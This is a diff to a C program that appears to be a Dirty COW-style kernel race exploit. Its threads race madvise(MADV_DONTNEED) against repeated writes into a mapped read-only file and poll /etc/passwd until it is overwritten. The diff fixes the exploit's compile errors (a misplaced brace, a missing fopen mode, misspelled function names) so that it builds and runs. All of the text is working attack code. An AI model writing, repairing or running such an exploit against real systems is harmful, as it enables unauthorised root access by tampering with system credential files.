@@ -54,12 +54,10 @@ void *writer_thread(void *arg) {
 	ERR_IF(fd < 0);
 	
 	for (int i = 0; i < THREAD_ITERATIONS && !stop; i++) {
-			lseek(fd, (uintptr_t) info->loc_in_mem + info->offset, SEEK_SET);
-		}
-
+		lseek(fd, (uintptr_t) info->loc_in_mem + info->offset, SEEK_SET);
 		write(fd, str, strlen(str));
 	}
-	printf("write finished");
+	printf("write finished\n");
 
 	return NULL;
 }
@@ -71,7 +69,7 @@ void *madviser_thread(void *arg) {
 	for (int i = 0; i < THREAD_ITERATIONS && !stop; i++) {
 		madvise(info->loc_in_mem, 100, MADV_DONTNEED);
 	}
-	printf
+	printf("Madviser finished\n");
 	return NULL;
 }
 
@@ -81,12 +79,12 @@ void *waitForWrite(void *arg) {
 	char buf[len];
 
 	for(;;) {
-		FILE *fp = fopen("/etc/passwd");
+		FILE *fp = fopen("/etc/passwd", "rb");
 		fseek(fp, info->offset, SEEK_SET);
 		fread(buf, len, 1, fp);
 
 		if(memcmp(buf, info->string, len) == 0) {
-			print("Target file is overwritten\n");
+			printf("Target file is overwritten\n");
 			break;
 		}
 
@@ -206,7 +204,7 @@ int main(int argc, char *argv[]) {
 
 	ERR_IF_PTHREAD(pthread_create(&thread_1, NULL, madviser_thread, &info));
 	ERR_IF_PTHREAD(pthread_create(&thread_2, NULL, writer_thread, &info));
-	ERR_IF_PTHREAD(pthread_create(&thread_3, NULL, waitFroWrite, &info));
+	ERR_IF_PTHREAD(pthread_create(&thread_3, NULL, waitForWrite, &info));
 
 	ERR_IF_PTHREAD(pthread_join(thread_1, NULL));
 	ERR_IF_PTHREAD(pthread_join(thread_2, NULL));
